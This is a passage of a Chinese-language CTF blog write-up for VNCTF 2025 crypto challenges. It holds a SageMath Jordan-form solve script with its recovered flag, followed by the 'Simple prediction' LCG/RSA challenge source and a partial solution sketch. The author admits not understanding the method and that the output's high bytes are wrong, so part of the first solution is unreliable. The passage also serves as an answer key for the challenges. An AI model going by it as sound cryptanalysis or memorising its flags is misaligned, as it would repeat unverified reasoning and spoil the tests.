class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width='0.875em' height='0.3em' style='width:0.875em' viewBox='0 0 875 300' preserveAspectRatio='xMinYMin'><path d='M457 0 H583 V300 H457 z'/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:2.289028em;"><span style="top:-4.5029200000000005em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span></span></span></span></span></p><p>使用jordan form:<code>本质是解一个模p下的线性方程组</code></p><blockquote><p>如果使用行列式方法，p-1并不光滑；如果使用一般线性群的阶，他所有的子群阶也都不光滑</p></blockquote><p>jordan form原理：</p><p>任何一个非奇异矩阵L都可以通过如下方式变换成jordan form：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><mo>=</mo><mi>P</mi><mo>∗</mo><mi>J</mi><mo>∗</mo><msup><mi>P</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mspace linebreak="newline"></mspace><mo stretchy="false">(</mo><msup><mi>P</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>∗</mo><mi>L</mi><mo>∗</mo><mi>P</mi><msup><mo stretchy="false">)</mo><mi>n</mi></msup><mo>=</mo><msup><mi>J</mi><mi>n</mi></msup><mspace linebreak="newline"></mspace><msup><mi>P</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>∗</mo><mi>L</mi><mi>n</mi><mo>∗</mo><mi>P</mi><mo>=</mo><msup><mi>J</mi><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">L=P*J*P^{-1}\\(P^{-1}*L*P)^n=J^n\\P^{-1}*Ln*P=J^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.09618em;">J</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.864108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.09618em;">J</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.864108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.09618em;">J</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span></span></p><p>（然后就看不懂了，原理一样，脚本也一样）</p><p><img src="/imgs/vnctf2025/2.png" alt="1" /></p><p>（最后结果高位有点问题，看不懂找不出原因）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">106743081253087007974132382690669187409167641660258665859915640694456867788135702053312073228376307091325146727550371538313884850638568106223326195447798997814912891375244381751926653858549419946547894675646011818800255999071070352934719005006228971056393128007601573916373180007524930454138943896336817929823</span><br>G = Zmod(p)<br><br><br>L = Matrix(Zmod(p),[<br>    [<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,-<span class="hljs-number">5</span>],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,-<span class="hljs-number">1</span>],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>]<br>])<br>vec1 = (<span class="hljs-number">2025</span>,<span class="hljs-number">208</span>,<span class="hljs-number">209</span>)<br>vec2 = (<span class="hljs-number">17199707718762989481733793569240992776243099972784327196212023936622130204798694753865087501654381623876011128783229020278210160383185417670794284015692458326761011808048967854332413536183785458993128524881447529380387804712214305034841856237045463243243451585619997751904403447841431924053651568039257094910</span>, <span class="hljs-number">62503976674384744837417986781499538335164333679603320998241675970253762411134672614307594505442798271581593168080110727738181755339828909879977419645331630791420448736959554172731899301884779691119177400457640826361914359964889995618273843955820050051136401731342998940859792560938931787155426766034754760036</span>, <span class="hljs-number">93840121740656543170616546027906623588891573113673113077637257131079221429328035796416874995388795184080636312185908173422461254266536066991205933270191964776577196573147847000446118311985331680378772920169894541350064423243733498672684875039906829095473677927238488927923581806647297338935716890606987700071</span>)<br><br>vec1 = vector(Zmod(p),vec1)<br>vec2 = vector(Zmod(p),vec2)<br><br>M1 = Matrix(Zmod(p),Matrix(vec1).T)<br>M1 = M1.augment(L*vec1)<br>M1 = M1.augment(L^<span class="hljs-number">2</span>*vec1)<br><br>M2 = Matrix(Zmod(p),Matrix(vec2).T)<br>M2 = M2.augment(L*vec2)<br>M2 = M2.augment(L^<span class="hljs-number">2</span>*vec2)<br><br>R = M2*M1^(-<span class="hljs-number">1</span>)<br><br>gl, P = L.jordan_form(transformation=<span class="hljs-literal">True</span>)<br>gr = P^(-<span class="hljs-number">1</span>)*R*P<br><br>g = gl[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>] <br>t = gr[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>] <span class="hljs-comment"># t = ng^(n-1)</span><br>k = gr[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>] <span class="hljs-comment"># k = g^n</span><br><span class="hljs-comment">#so gt = nk  -&gt;  n = gtk^(-1)</span><br><br>n = g * t * inverse(k,p) % p<br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(n)))<br><span class="hljs-comment">#b&#x27;\xd6NCTF&#123;WWhy_diagonalization_1s_s0_brRRRrRrrRrrrRrRRrRRrrrRrRrRuUuUUUTTTtte3333?????ouch!ouch!Th3t_is_S0_Crazy!!!!&#125;&#x27;</span><br><span class="hljs-comment">#VNCTF&#123;WWhy_diagonalization_1s_s0_brRRRrRrrRrrrRrRRrRRrrrRrRrRuUuUUUTTTtte3333?????ouch!ouch!Th3t_is_S0_Crazy!!!!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="simple-prediction"><a class="markdownIt-Anchor" href="#simple-prediction"></a> Simple prediction</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> shuffle<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice, randint<br><br><span class="hljs-comment"># flag来源</span><br>flag = <span class="hljs-string">b&quot;VNCTF&#123;xxxxxxx&#125;&quot;</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag)&lt;<span class="hljs-number">100</span><br>FLAG1=flag[:<span class="hljs-number">32</span>]<br>FLAG2=flag[<span class="hljs-number">32</span>:]<br><br><span class="hljs-comment"># part1</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LCG</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, seed=<span class="hljs-literal">None</span>, a=<span class="hljs-literal">None</span>, b=<span class="hljs-literal">None</span>, m=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> m:<br>            <span class="hljs-variable language_">self</span>.m = getPrime(<span class="hljs-number">512</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> seed:<br>            <span class="hljs-variable language_">self</span>.seed = getPrime(<span class="hljs-number">512</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> a:<br>            <span class="hljs-variable language_">self</span>.a = getPrime(<span class="hljs-number">512</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> b:<br>            <span class="hljs-variable language_">self</span>.b = getPrime(<span class="hljs-number">512</span>)<br>        <span class="hljs-comment">#print(f&quot;LCG 初始化参数: seed=&#123;self.seed&#125;\n a=&#123;self.a&#125;\n b=&#123;self.b&#125;\n m=&#123;self.m&#125;&quot;)</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-variable language_">self</span>.m,<span class="hljs-variable language_">self</span>.seed,<span class="hljs-variable language_">self</span>.a,<span class="hljs-variable language_">self</span>.b)<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.seed = (<span class="hljs-variable language_">self</span>.seed * <span class="hljs-variable language_">self</span>.a + <span class="hljs-variable language_">self</span>.b) % <span class="hljs-variable language_">self</span>.m<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.seed<br>binary_flag = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;byte:08b&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> FLAG1)<br>m = [<span class="hljs-built_in">int</span>(bit) <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> binary_flag]<br><br>n=[]<br>lcg=LCG()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m:<br>    z=lcg.<span class="hljs-built_in">next</span>()<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:<br>        n.append(z)<br>    <span class="hljs-keyword">else</span>:<br>        z=randint(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>**<span class="hljs-number">512</span>)<br>        n.append(z)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n=<span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># part2</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FlagEncoder</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, flag: <span class="hljs-built_in">bytes</span>, e: <span class="hljs-built_in">int</span> = <span class="hljs-number">65537</span></span>):<br>        <span class="hljs-variable language_">self</span>.flag = flag<br>        <span class="hljs-variable language_">self</span>.e = e<br>        <span class="hljs-variable language_">self</span>.encoded_flag = []<br>        <span class="hljs-variable language_">self</span>.n = <span class="hljs-literal">None</span><br>        <span class="hljs-variable language_">self</span>.c = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> idx, byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-variable language_">self</span>.flag):<br>            <span class="hljs-variable language_">self</span>.encoded_flag.extend([idx + <span class="hljs-number">0x1234</span>] * byte)<br>        shuffle(<span class="hljs-variable language_">self</span>.encoded_flag)<br>        p, q = getPrime(<span class="hljs-number">1024</span>), getPrime(<span class="hljs-number">1024</span>)<br>        <span class="hljs-variable language_">self</span>.n = p * q<br>        <span class="hljs-variable language_">self</span>.c = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">pow</span>(m, <span class="hljs-variable language_">self</span>.e, <span class="hljs-variable language_">self</span>.n) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.encoded_flag) % <span class="hljs-variable language_">self</span>.n<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.n = &#125;</span>\n<span class="hljs-subst">&#123;self.e = &#125;</span>\n<span class="hljs-subst">&#123;self.c = &#125;</span>\n&quot;</span>)<br><br>encoder = FlagEncoder(FLAG2)<br>encoder.process()<br></code></pre></td></tr></table></figure><h3 id="part1"><a class="markdownIt-Anchor" href="#part1"></a> part1</h3><p>LCG但不是连着的，当flag的二进制为1时，我们没有这个数据了。所以我们需要找到连着的数据，当然跳过一次的也算连着</p><p>例如：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>2</mn></mrow></msub><mo>=</mo><msup><mi>a</mi><mn>2</mn></msup><msub><mi>s</mi><mi>i</mi></msub><mo>+</mo><mi>a</mi><mi>b</mi><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">s_{i+2}=a^2s_i+ab+b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.638891em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.964108em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span>，我们可假设<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>=</mo><msup><mi>a</mi><mn>2</mn></msup><mo separator="true">,</mo><mi>b</mi><mo>=</mo><mi>a</mi><mi>b</mi><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">a=a^2,b=ab+b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span>，也是一个LCG</p><p>我们还知道flag头为<code>VNCTF&#123;</code>，二进制为<code>010101100100111001000011010101000100011001111011</code></p><p>通过手动打表，到最后一串<code>000</code>这时，可以发现有一大串连着的数据（前面也有连着的数据，但不够多，或者试了没用）</p><p>利用这6组数据，我们可以求出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>模数</mtext><mi>p</mi><mo separator="true">,</mo><msup><mi>a</mi><mn>2</mn></msup><mo separator="true">,</mo><mi>a</mi><mi>b</mi><mo>+</mo><mi>b</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>e</mi><msub><mi>d</mi><mn>25</mn></msub></mrow><annotation encoding="application/x-tex">模数p,a^2,ab+b,seed_{25}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，只有p是原来的，我们还需要还原出原来的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>e</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">a,b,seed</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span></span></span></span>，通过之前一题，我直接用AMM来开<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">a^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>了，然后<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>e</mi><msub><mi>d</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">b,seed_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 